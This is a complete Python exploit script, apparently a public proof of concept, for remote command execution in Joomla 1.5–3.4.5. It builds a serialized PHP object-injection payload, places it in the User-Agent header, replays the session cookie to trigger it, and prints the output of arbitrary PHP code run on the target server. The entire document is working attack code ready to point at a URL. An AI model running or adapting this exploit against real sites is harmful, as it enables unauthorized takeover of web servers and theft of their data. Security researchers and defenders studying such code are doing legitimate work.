#!/usr/bin/env python

"""joomlarce.py: Simple RCE exploit for Joomla 1.5-3.4.5.
Details: https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html
run: ./joomlarce.py "https?://url" "php_eval_code"
"""

__author__      = "@iamsecurity"

import requests
import sys

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

if len(sys.argv)<3:
	print('Enter url and command to execution')
	sys.exit(1)
url = sys.argv[1]
cmd = sys.argv[2]
tag = "<j_grep_code>"
tag_c = "</j_grep_code>"
cmd = "echo('"+tag+"');"+cmd+"echo('"+tag_c+"');"
r = requests
php_code = ".".join(["chr({0})".format(ord(char)) for char in cmd])
ua = "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:2:\x22fc\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:8:\x22feed_url\x22;s:%s:\x22eval(%s);JFactory::getConfig();exit\x22;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:5:\x22cache\x22;b:1;s:11:\x22cache_class\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;b:1;}\xF0\x9D\x8C\x86"
ua = ua % (33+len(php_code), php_code)
headers = {"User-Agent": ua}
response = r.get(url, verify=False, headers=headers)
cookies = response.cookies
print ("Cookies:", cookies)
response = r.get(url, verify=False, cookies=cookies)
print ("Response:", find_between(response.content, tag.encode(), tag_c.encode()).decode())
